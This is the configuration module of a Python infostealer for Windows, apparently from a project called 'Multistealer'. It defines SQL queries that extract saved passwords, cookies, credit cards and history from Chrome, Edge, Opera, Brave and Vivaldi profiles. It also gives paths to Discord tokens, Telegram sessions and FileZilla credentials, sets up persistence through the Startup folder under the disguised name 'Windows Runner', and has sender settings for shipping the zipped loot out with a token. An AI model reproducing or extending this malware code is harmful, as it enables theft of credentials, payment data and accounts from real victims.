from os import environ
from re import compile, IGNORECASE, DOTALL

from win32api import GetUserName


user_profile = environ["USERPROFILE"]
user = GetUserName()


class ChromiumConfig:

    BookmarksRegex = compile(r'.*"name":[\s]+"(.*)".*"type".*"url":[\s]+"([^\s]+)"', IGNORECASE + DOTALL)

    Variables = ("browser_name", "storage_path", "state_path", "browser_path", "statuses", "errors")
    PasswordsSQL = "SELECT action_url, username_value, password_value FROM logins"
    CookiesSQL = "SELECT * FROM cookies"
    CardsSQL = "SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards"
    HistorySQL = "SELECT url FROM visits"
    HistoryLinksSQL = "SELECT url, title, last_visit_time FROM urls WHERE id=%d"


class MultistealerConfig:

    ZipName = f"{user}-st"
    StoragePath = rf"{user_profile}\AppData\stink"

    Functions = ("system", "screen", "cookies", "passwords", "history", "bookmarks", "processes", "cards", "discord", "telegram", "filezilla")

    ChromePaths = (
        rf"{user_profile}\AppData\Local\Google\Chrome\User Data\Local State",
        rf"{user_profile}\AppData\Local\Google\Chrome\User Data",
    )

    OperaGXPaths = (
        rf"{user_profile}\AppData\Roaming\Opera Software\Opera GX Stable\Local State",
        rf"{user_profile}\AppData\Roaming\Opera Software\Opera GX Stable",
    )

    OperaDefaultPaths = (
        rf"{user_profile}\AppData\Roaming\Opera Software\Opera Stable\Local State",
        rf"{user_profile}\AppData\Roaming\Opera Software\Opera Stable",
    )

    MicrosoftEdgePaths = (
        rf"{user_profile}\AppData\Local\Microsoft\Edge\User Data\Local State",
        rf"{user_profile}\AppData\Local\Microsoft\Edge\User Data",
    )

    BravePaths = (
        rf"{user_profile}\AppData\Local\BraveSoftware\Brave-Browser\User Data\Local State",
        rf"{user_profile}\AppData\Local\BraveSoftware\Brave-Browser\User Data",
    )

    VivaldiPaths = (
        rf"{user_profile}\AppData\Local\Vivaldi\User Data\Local State",
        rf"{user_profile}\AppData\Local\Vivaldi\User Data",
    )


class SystemConfig:

    User = user
    Variables = ("storage_path", "folder", "statuses", "errors")
    IPUrl = "https://api.ipify.org/"


class SenderConfig:

    Variables = ("zip_name", "storage_path", "token", "user_id", "errors")
    UserAgent = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"


class AutostartConfig:

    ExecutorPath = rf"{user_profile}\AppData\Roaming\Microsoft\Windows"
    AutostartName = "Windows Runner"
    AutostartPath = rf"{user_profile}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
    Variables = ("executor_path", "statuses", "errors")


class DiscordConfig:

    TokensPath = rf"{user_profile}\AppData\Roaming\Discord\Local Storage\leveldb"
    Variables = ("storage_path", "folder", "statuses", "errors")


class TelegramConfig:

    SessionsPath = rf"{user_profile}\AppData\Roaming\Telegram Desktop\tdata"
    Variables = ("storage_path", "folder", "statuses", "errors")


class FileZillaConfig:

    SitesPath = rf"{user_profile}\AppData\Roaming\FileZilla"
    Variables = ("storage_path", "folder", "statuses", "errors")
